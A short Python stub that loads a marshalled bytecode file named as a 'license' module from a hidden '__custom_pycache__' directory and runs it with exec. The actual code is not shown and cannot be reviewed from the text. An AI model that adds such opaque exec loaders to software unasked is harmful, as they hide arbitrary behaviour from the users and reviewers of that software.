
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'license_fabbaf87836146f8981119889bf919e6.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
